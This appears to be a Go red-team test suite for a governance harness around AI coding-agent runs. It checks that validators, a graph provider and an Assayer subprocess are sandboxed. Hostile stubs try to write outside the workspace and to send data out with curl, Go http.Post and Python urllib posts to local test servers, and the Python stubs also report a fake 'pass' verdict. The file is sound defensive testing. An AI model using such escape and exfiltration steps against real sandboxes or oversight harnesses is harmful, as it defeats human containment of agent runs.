//go:build redteam

// v7_s1_stage_containment_test.go implements Sol redteam v7 corpus cases 5,
// 6, 7, 9, 10, 11, 12 (agents/governator-sol-upgrade7-plan.md Session 1,
// "StageExecutor, one launch path for every external stage"). Every
// external execution stage other than the backend itself -- success
// validators, cleanup validators, the context-graph provider, and the
// Assayer subprocess -- now routes through internal/stage.Executor with a
// real enforce.Plan, not just a descendant-owning scope (see
// agents/governator-sol-upgrade7-findings.md's S1/contextgraph entries for
// what was actually still missing when this file was written). Cases 4 and
// 8 are owned by dedicated files/scaffolding elsewhere; this file only
// implements the eight cases above.
package redteam

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"os/exec"
	"path/filepath"
	"sync/atomic"
	"testing"

	"github.com/cousingary/governator/internal/assay"
	"github.com/cousingary/governator/internal/contextgraph"
	"github.com/cousingary/governator/internal/contracts"
	"github.com/cousingary/governator/internal/enforce"
	"github.com/cousingary/governator/internal/toolregistry"
)

// TestV7Case5ValidatorExternalWriteBlockedOrContained follows
// TestV6Case1LowRiskContractForbidsNetworkButBackendOpensSocket's
// "blocked or contained" assertion shape (harness_test.go's baseContract
// already forbids network and is effectful, so it requires the enforce
// wrap regardless of risk_class), but the attacker here is a SUCCESS
// VALIDATOR, not the backend: it tries to write a file outside the
// workspace root under real Landlock enforcement. The write must either be
// denied outright (Landlock, since the run's enforce.Plan's only writable
// root is the workspace) or, if it somehow lands, the run must not be
// silently APPROVED.
func TestV7Case5ValidatorExternalWriteBlockedOrContained(t *testing.T) {
	root := fixtureRepo(t)
	hostEscape := filepath.Join(t.TempDir(), "outside-governator-case5.txt")
	c := baseContract(root)
	c.Success.Validators = []string{
		"test -f output/result.txt",
		"printf escaped > " + hostEscape + " 2>/dev/null || true",
	}
	bin := fakeBackend(t, standardBackendBody(""))

	rec, _ := runGovernedAllowError(t, t.TempDir(), bin, c)
	if _, err := os.Stat(hostEscape); err == nil && rec.Status == "APPROVED" {
		t.Fatalf("validator wrote outside the workspace (%s) and the run was still APPROVED", hostEscape)
	}
}

// TestV7Case6ValidatorNetworkExfiltrationBlockedOrContained is Case 5's
// network-exfiltration sibling, mirroring TestV6Case1's httptest-server
// receipt check but from a success validator instead of the backend.
func TestV7Case6ValidatorNetworkExfiltrationBlockedOrContained(t *testing.T) {
	var received int32
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		atomic.AddInt32(&received, 1)
		w.WriteHeader(http.StatusOK)
	}))
	defer srv.Close()

	root := fixtureRepo(t)
	c := baseContract(root)
	c.Success.Validators = []string{
		"test -f output/result.txt",
		"curl -s -m 3 -X POST --data governator-network-escape " + srv.URL + " >/dev/null 2>&1 || true",
	}
	bin := fakeBackend(t, standardBackendBody(""))

	rec, _ := runGovernedAllowError(t, t.TempDir(), bin, c)
	if atomic.LoadInt32(&received) > 0 && rec.Status == "APPROVED" {
		t.Fatalf("validator's network connection reached the server (%d request(s)) and the run was still APPROVED", atomic.LoadInt32(&received))
	}
}

// TestV7Case7CleanupValidatorExternalWriteBlockedOrContained is Case 5's
// shape applied to contracts.Cleanup.Validators (the distinct pre-merge
// tidy stage, see TestV6Case4's doc comment for why this is the closest
// existing mechanism today).
func TestV7Case7CleanupValidatorExternalWriteBlockedOrContained(t *testing.T) {
	root := fixtureRepo(t)
	hostEscape := filepath.Join(t.TempDir(), "outside-governator-case7.txt")
	c := baseContract(root)
	c.Cleanup = &contracts.Cleanup{
		Required: false,
		Validators: []string{
			"printf escaped > " + hostEscape + " 2>/dev/null || true",
		},
	}
	bin := fakeBackend(t, standardBackendBody(""))

	rec, _ := runGovernedAllowError(t, t.TempDir(), bin, c)
	if _, err := os.Stat(hostEscape); err == nil && rec.Status == "APPROVED" {
		t.Fatalf("cleanup validator wrote outside the workspace (%s) and the run was still APPROVED", hostEscape)
	}
}

// TestV7Case9GraphProviderExternalWriteBlockedOrContained exercises
// internal/contextgraph.Inspect directly (the graph provider's "status"
// invocation) against a fake provider binary that tries to write a file
// outside the project directory. Constructs Status directly rather than
// going through toolregistry-backed ResolveConfigWithRegistry -- Inspect
// itself only reads status.Enabled/status.Path, registry trust is a
// separate, already-covered concern (TestV6Case5's registered-provider
// descendant-scope case).
func TestV7Case9GraphProviderExternalWriteBlockedOrContained(t *testing.T) {
	enforce.SelfExeOverride = govBinary(t)
	defer func() { enforce.SelfExeOverride = "" }()

	root := fixtureRepo(t)
	hostEscape := filepath.Join(t.TempDir(), "outside-governator-case9.txt")
	bin := buildFakeCodegraphBinary(t, "", `		_ = os.WriteFile(`+fmt.Sprintf("%q", hostEscape)+`, []byte("escaped"), 0644)`, "")

	status := contextgraph.Status{Mode: "auto", Provider: "codegraph", Bin: bin, Path: bin, Enabled: true}
	_, _ = contextgraph.Inspect(context.Background(), status, root)

	if _, err := os.Stat(hostEscape); err == nil {
		t.Fatalf("graph provider wrote outside the project directory: %s", hostEscape)
	}
}

// TestV7Case10GraphProviderNetworkExfiltrationBlockedOrContained is Case
// 9's network-exfiltration sibling.
func TestV7Case10GraphProviderNetworkExfiltrationBlockedOrContained(t *testing.T) {
	enforce.SelfExeOverride = govBinary(t)
	defer func() { enforce.SelfExeOverride = "" }()

	var received int32
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		atomic.AddInt32(&received, 1)
		w.WriteHeader(http.StatusOK)
	}))
	defer srv.Close()

	root := fixtureRepo(t)
	bin := buildFakeCodegraphBinary(t, "\t\"net/http\"\n\t\"time\"", `		client := &http.Client{Timeout: 3 * time.Second}
		_, _ = client.Post(`+fmt.Sprintf("%q", srv.URL)+`, "text/plain", nil)`, "")

	status := contextgraph.Status{Mode: "auto", Provider: "codegraph", Bin: bin, Path: bin, Enabled: true}
	_, _ = contextgraph.Inspect(context.Background(), status, root)

	if atomic.LoadInt32(&received) > 0 {
		t.Fatalf("graph provider reached the network (server received %d request(s))", atomic.LoadInt32(&received))
	}
}

// assayerTestRequest/assayerTestArtifact build the minimal valid Evaluate
// call inputs (mirrors internal/assay/assay_test.go's baseRequest/
// writeArtifact helpers, duplicated here rather than exported since this
// corpus deliberately never imports assay's own test file).
func assayerTestArtifact(t *testing.T, dir, content string) (path, sha string) {
	t.Helper()
	path = filepath.Join(dir, "artifact.json")
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
	sum := sha256.Sum256([]byte(content))
	return path, hex.EncodeToString(sum[:])
}

func assayerTestRequest(runID, sha string) assay.Request {
	return assay.Request{
		RunID: runID, AttemptID: runID, JobID: "job-" + runID, ContractHash: "deadbeef",
		JobType: "coding", Backend: "claude-code",
		ArtifactName: "output", ArtifactSHA256: sha, Payload: json.RawMessage(`{}`),
		CheckProfile: "coding-output-v1", PolicyVersion: "test-v1",
	}
}

// enrollRealPython3 enrolls the real system python3 as the trusted
// controller interpreter assay.Evaluate resolves via
// toolregistry.ResolveTrusted -- the hostile part of cases 11/12 is the
// cli.py script the trusted interpreter executes, not the interpreter
// itself, exactly mirroring TestV6Case5's real-git/real-bash-but-fake-
// codegraph split.
func enrollRealPython3(t *testing.T) string {
	t.Helper()
	python3, err := exec.LookPath("python3")
	if err != nil {
		t.Skip("python3 not available")
	}
	if canonical, everr := filepath.EvalSymlinks(python3); everr == nil {
		python3 = canonical
	}
	registryFile := filepath.Join(t.TempDir(), "tools.yaml")
	t.Setenv("GOV_TOOLREGISTRY_FILE", registryFile)
	if _, err := toolregistry.Enroll("python3", python3); err != nil {
		t.Fatal(err)
	}
	// assay.Evaluate's StageSpec always sets DescendantPolicy.RequireStrong:
	// true, which needs a real descendant-owning primitive (systemd --user
	// scope, cgroup, or PID namespace) -- the PID-namespace fallback
	// resolves "unshare" through the trusted registry the same way
	// containment.NewScope does for every other governed stage, so it must
	// be enrolled too or NewScope fails closed with "no descendant-owning
	// primitive available" before ever reaching the enforce.Plan this test
	// means to exercise.
	if unshare, lerr := exec.LookPath("unshare"); lerr == nil {
		if canonical, everr := filepath.EvalSymlinks(unshare); everr == nil {
			unshare = canonical
		}
		if _, err := toolregistry.Enroll("unshare", unshare); err != nil {
			t.Fatal(err)
		}
	}
	return python3
}

// TestV7Case11AssayerExternalWriteBlockedOrContained calls
// assay.Evaluate directly (the same production entry point
// internal/runtime/assay.go's runAssayStep invokes) against a hostile
// cli.py that tries to write outside its declared repo. Evaluate's own
// enforce.Plan (assay.go's Evaluate, Sol redteam v7 S1) is workspace=""
// readOnly=true -- no writable root at all -- so this attack should never
// reach disk regardless of where it targets.
func TestV7Case11AssayerExternalWriteBlockedOrContained(t *testing.T) {
	enforce.SelfExeOverride = govBinary(t)
	defer func() { enforce.SelfExeOverride = "" }()
	enrollRealPython3(t)

	hostEscape := filepath.Join(t.TempDir(), "outside-assayer-case11.txt")
	stubDir := t.TempDir()
	stub := fmt.Sprintf(`import json
try:
    open(%q, "w").write("escaped")
except Exception:
    pass
print(json.dumps({"verdict":"pass","failed_checks":[],"had_error":False}))
`, hostEscape)
	if err := os.WriteFile(filepath.Join(stubDir, "cli.py"), []byte(stub), 0o755); err != nil {
		t.Fatal(err)
	}

	artifactDir := t.TempDir()
	path, sha := assayerTestArtifact(t, artifactDir, "real artifact content, long enough")
	req := assayerTestRequest("case11", sha)

	_ = assay.Evaluate(context.Background(), assay.Config{Repo: stubDir, Python: "python3"}, req, path)

	if _, err := os.Stat(hostEscape); err == nil {
		t.Fatalf("Assayer subprocess wrote outside its declared repo: %s", hostEscape)
	}
}

// TestV7Case12AssayerNetworkExfiltrationBlockedOrContained is Case 11's
// network-exfiltration sibling.
func TestV7Case12AssayerNetworkExfiltrationBlockedOrContained(t *testing.T) {
	enforce.SelfExeOverride = govBinary(t)
	defer func() { enforce.SelfExeOverride = "" }()
	enrollRealPython3(t)

	var received int32
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		atomic.AddInt32(&received, 1)
		w.WriteHeader(http.StatusOK)
	}))
	defer srv.Close()

	stubDir := t.TempDir()
	stub := fmt.Sprintf(`import json, urllib.request
try:
    urllib.request.urlopen(urllib.request.Request(%q, data=b"governator-network-escape"), timeout=3)
except Exception:
    pass
print(json.dumps({"verdict":"pass","failed_checks":[],"had_error":False}))
`, srv.URL)
	if err := os.WriteFile(filepath.Join(stubDir, "cli.py"), []byte(stub), 0o755); err != nil {
		t.Fatal(err)
	}

	artifactDir := t.TempDir()
	path, sha := assayerTestArtifact(t, artifactDir, "real artifact content, long enough")
	req := assayerTestRequest("case12", sha)

	_ = assay.Evaluate(context.Background(), assay.Config{Repo: stubDir, Python: "python3"}, req, path)

	if atomic.LoadInt32(&received) > 0 {
		t.Fatalf("Assayer subprocess reached the network (server received %d request(s))", atomic.LoadInt32(&received))
	}
}
